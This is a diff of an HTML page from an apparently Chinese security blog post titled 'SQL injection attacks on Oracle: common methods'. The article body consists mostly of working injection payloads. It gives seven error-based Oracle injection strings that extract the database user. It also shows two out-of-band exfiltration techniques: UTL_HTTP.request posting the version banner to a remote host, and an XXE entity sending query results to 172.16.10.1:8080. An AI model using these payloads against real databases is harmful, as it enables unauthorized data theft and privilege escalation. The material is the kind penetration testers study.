@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>hack oracle | 随风&#39;S Blog</title>
+    <title>Sql注入攻击Oracle常见方法 | 随风&#39;S Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="iswin">
@@ -13,20 +13,20 @@
     
     <meta name="description" content="本文主要讨论在得到一枚oracle注入点时，如何通过Oracle自带函数或者缺陷获取数据，权限提升以及获得系统权限。
 
-报错注入的几种方式0x1 utl_inaddr.get_host_name这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。1">
+数据获取报错注入的几种方式0x1 utl_inaddr.get_host_name这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hack oracle">
+<meta property="og:title" content="Sql注入攻击Oracle常见方法">
 <meta property="og:url" content="http://www.iswin.org/2015/06/13/hack-oracle/index.html">
 <meta property="og:site_name" content="随风'S Blog">
 <meta property="og:description" content="本文主要讨论在得到一枚oracle注入点时，如何通过Oracle自带函数或者缺陷获取数据，权限提升以及获得系统权限。
 
-报错注入的几种方式0x1 utl_inaddr.get_host_name这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。1">
-<meta property="og:updated_time" content="2015-06-13T13:05:25.000Z">
+数据获取报错注入的几种方式0x1 utl_inaddr.get_host_name这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问">
+<meta property="og:updated_time" content="2015-06-13T15:01:21.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hack oracle">
+<meta name="twitter:title" content="Sql注入攻击Oracle常见方法">
 <meta name="twitter:description" content="本文主要讨论在得到一枚oracle注入点时，如何通过Oracle自带函数或者缺陷获取数据，权限提升以及获得系统权限。
 
-报错注入的几种方式0x1 utl_inaddr.get_host_name这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。1">
+数据获取报错注入的几种方式0x1 utl_inaddr.get_host_name这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问">
 
     
     <link rel="alternative" href="/atom.xml" title="随风&#39;S Blog" type="application/atom+xml">
@@ -86,7 +86,7 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/06/13/hack-oracle/" title="hack oracle" itemprop="url">hack oracle</a>
+      <a href="/2015/06/13/hack-oracle/" title="Sql注入攻击Oracle常见方法" itemprop="url">Sql注入攻击Oracle常见方法</a>
   </h1>
   <p class="article-author">By
        
@@ -102,21 +102,22 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入的几种方式"><span class="toc-number">1.</span> <span class="toc-text">报错注入的几种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1_utl_inaddr-get_host_name"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 utl_inaddr.get_host_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2_ctxsys-drithsx-sn"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 ctxsys.drithsx.sn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3_XMLType"><span class="toc-number">1.3.</span> <span class="toc-text">0x3 XMLType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4_dbms_xdb_version-checkin"><span class="toc-number">1.4.</span> <span class="toc-text">0x4 dbms_xdb_version.checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5_dbms_xdb_version-makeversioned"><span class="toc-number">1.5.</span> <span class="toc-text">0x5 dbms_xdb_version.makeversioned</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x6_dbms_xdb_version-uncheckout"><span class="toc-number">1.6.</span> <span class="toc-text">0x6 dbms_xdb_version.uncheckout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x7_dbms_utility-sqlid_to_sqlhash"><span class="toc-number">1.7.</span> <span class="toc-text">0x7 dbms_utility.sqlid_to_sqlhash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x8"><span class="toc-number">1.8.</span> <span class="toc-text">0x8</span></a></li></ol></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#数据获取"><span class="toc-number">1.</span> <span class="toc-text">数据获取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入的几种方式"><span class="toc-number">1.1.</span> <span class="toc-text">报错注入的几种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1_utl_inaddr-get_host_name"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x1 utl_inaddr.get_host_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2_ctxsys-drithsx-sn"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x2 ctxsys.drithsx.sn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3_XMLType"><span class="toc-number">1.1.3.</span> <span class="toc-text">0x3 XMLType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4_dbms_xdb_version-checkin"><span class="toc-number">1.1.4.</span> <span class="toc-text">0x4 dbms_xdb_version.checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5_dbms_xdb_version-makeversioned"><span class="toc-number">1.1.5.</span> <span class="toc-text">0x5 dbms_xdb_version.makeversioned</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x6_dbms_xdb_version-uncheckout"><span class="toc-number">1.1.6.</span> <span class="toc-text">0x6 dbms_xdb_version.uncheckout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x7_dbms_utility-sqlid_to_sqlhash"><span class="toc-number">1.1.7.</span> <span class="toc-text">0x7 dbms_utility.sqlid_to_sqlhash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UTL_HTTP-request的使用"><span class="toc-number">1.2.</span> <span class="toc-text">UTL_HTTP.request的使用</span></a></li></ol></li></ol>
 		
 		</div>
 		
 		<blockquote>
 <p>本文主要讨论在得到一枚oracle注入点时，如何通过Oracle自带函数或者缺陷获取数据，权限提升以及获得系统权限。</p>
 </blockquote>
-<h2 id="报错注入的几种方式">报错注入的几种方式</h2><h3 id="0x1_utl_inaddr-get_host_name">0x1 utl_inaddr.get_host_name</h3><p>这种方法在<em>Oracle 8g，9g，10g</em>中不需要任何权限，但是在<em>Oracle 11g</em>以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and 1=utl_inaddr.get_host_name((<span class="operator"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="comment">--</span></span></span><br></pre></td></tr></table></figure></p>
+<h1 id="数据获取">数据获取</h1><h2 id="报错注入的几种方式">报错注入的几种方式</h2><h3 id="0x1_utl_inaddr-get_host_name">0x1 utl_inaddr.get_host_name</h3><p>这种方法在<em>Oracle 8g，9g，10g</em>中不需要任何权限，但是在<em>Oracle 11g</em>以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and 1=utl_inaddr.get_host_name((<span class="operator"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="comment">--</span></span></span><br></pre></td></tr></table></figure></p>
 <h3 id="0x2_ctxsys-drithsx-sn">0x2 ctxsys.drithsx.sn</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and 1=ctxsys.drithsx.sn(1,(<span class="operator"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="comment">--</span></span></span><br></pre></td></tr></table></figure>
 <h3 id="0x3_XMLType">0x3 XMLType</h3><p>在使用这个XMLType进行报错时，很多人不知道为什么要用chr(60)，通过ascii查询可以看到，60:&lt;,58:’:’,62:’&gt;’,查了下相关的api，发现xmltype在进行解析的时候必须以&lt;开头&gt;结尾，这里:冒号在这是必不可少的，至于为什么是冒号这个我也没查到，另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，有replace函数替换成其他非空字符就可以。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="operator"><span class="keyword">select</span> <span class="keyword">upper</span>(XMLType(chr(<span class="number">60</span>)||chr(<span class="number">58</span>)||(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)||chr(<span class="number">62</span>))) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span></span><br></pre></td></tr></table></figure></p>
 <h3 id="0x4_dbms_xdb_version-checkin">0x4 dbms_xdb_version.checkin</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="operator"><span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span></span><br></pre></td></tr></table></figure>
 <h3 id="0x5_dbms_xdb_version-makeversioned">0x5 dbms_xdb_version.makeversioned</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="operator"><span class="keyword">select</span> dbms_xdb_version.makeversioned((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span></span><br></pre></td></tr></table></figure>
 <h3 id="0x6_dbms_xdb_version-uncheckout">0x6 dbms_xdb_version.uncheckout</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="operator"><span class="keyword">select</span> dbms_xdb_version.uncheckout((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span></span><br></pre></td></tr></table></figure>
 <h3 id="0x7_dbms_utility-sqlid_to_sqlhash">0x7 dbms_utility.sqlid_to_sqlhash</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="operator"><span class="keyword">SELECT</span> dbms_utility.sqlid_to_sqlhash((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span></span><br></pre></td></tr></table></figure>
-<h3 id="0x8">0x8</h3>  
+<h2 id="UTL_HTTP-request的使用">UTL_HTTP.request的使用</h2><p>通过utl_http.request我们可以将查询的结果发送到远程服务器上，在遇到盲注时非常有用，要使用该方法用户需要有utl_http访问网络的权限。<br><figure class="highlight sql"><figcaption><span>UTL_HTTP.request('http://www.iswin.org:80/'||(select banner from sys.v_$version where rownum=1))=1— </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">##Oracle XXE</span><br><span class="line">这里Oracle的XXE的利用效果和UTL_http的效果差不多，都是将数据传输到远端服务器上，但是，由于extractvalue()函数对所有数据库用户都可以使用，不存在权限的问题，所以当在低权限没有UTL_http访问权限时，这个不失为一个好方法。</span><br><span class="line">```sql</span><br><span class="line"><span class="operator"><span class="keyword">select</span> extractvalue(xmltype(<span class="string">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://172.16.10.1:8080/'</span>||(<span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)||<span class="string">'"&gt; %remote;]&gt;'</span>),<span class="string">'/l'</span>) <span class="keyword">from</span> dual</span></span><br></pre></td></tr></table></figure></p>
+  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
@@ -138,7 +139,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://www.iswin.org/2015/06/13/hack-oracle/" data-title="hack oracle | 随风&#39;S Blog" data-tsina="null" class="share clearfix">
+	  <div data-url="http://www.iswin.org/2015/06/13/hack-oracle/" data-title="Sql注入攻击Oracle常见方法 | 随风&#39;S Blog" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -164,7 +165,7 @@
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2015/06/13/hack-oracle/" data-title="hack oracle" data-url="http://www.iswin.org/2015/06/13/hack-oracle/"></div>
+	<div class="ds-thread" data-thread-key="2015/06/13/hack-oracle/" data-title="Sql注入攻击Oracle常见方法" data-url="http://www.iswin.org/2015/06/13/hack-oracle/"></div>
 </section>
 
 
@@ -174,7 +175,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入的几种方式"><span class="toc-number">1.</span> <span class="toc-text">报错注入的几种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1_utl_inaddr-get_host_name"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 utl_inaddr.get_host_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2_ctxsys-drithsx-sn"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 ctxsys.drithsx.sn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3_XMLType"><span class="toc-number">1.3.</span> <span class="toc-text">0x3 XMLType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4_dbms_xdb_version-checkin"><span class="toc-number">1.4.</span> <span class="toc-text">0x4 dbms_xdb_version.checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5_dbms_xdb_version-makeversioned"><span class="toc-number">1.5.</span> <span class="toc-text">0x5 dbms_xdb_version.makeversioned</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x6_dbms_xdb_version-uncheckout"><span class="toc-number">1.6.</span> <span class="toc-text">0x6 dbms_xdb_version.uncheckout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x7_dbms_utility-sqlid_to_sqlhash"><span class="toc-number">1.7.</span> <span class="toc-text">0x7 dbms_utility.sqlid_to_sqlhash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x8"><span class="toc-number">1.8.</span> <span class="toc-text">0x8</span></a></li></ol></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#数据获取"><span class="toc-number">1.</span> <span class="toc-text">数据获取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入的几种方式"><span class="toc-number">1.1.</span> <span class="toc-text">报错注入的几种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1_utl_inaddr-get_host_name"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x1 utl_inaddr.get_host_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2_ctxsys-drithsx-sn"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x2 ctxsys.drithsx.sn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3_XMLType"><span class="toc-number">1.1.3.</span> <span class="toc-text">0x3 XMLType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4_dbms_xdb_version-checkin"><span class="toc-number">1.1.4.</span> <span class="toc-text">0x4 dbms_xdb_version.checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5_dbms_xdb_version-makeversioned"><span class="toc-number">1.1.5.</span> <span class="toc-text">0x5 dbms_xdb_version.makeversioned</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x6_dbms_xdb_version-uncheckout"><span class="toc-number">1.1.6.</span> <span class="toc-text">0x6 dbms_xdb_version.uncheckout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x7_dbms_utility-sqlid_to_sqlhash"><span class="toc-number">1.1.7.</span> <span class="toc-text">0x7 dbms_utility.sqlid_to_sqlhash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UTL_HTTP-request的使用"><span class="toc-number">1.2.</span> <span class="toc-text">UTL_HTTP.request的使用</span></a></li></ol></li></ol>
  
   </div>
 
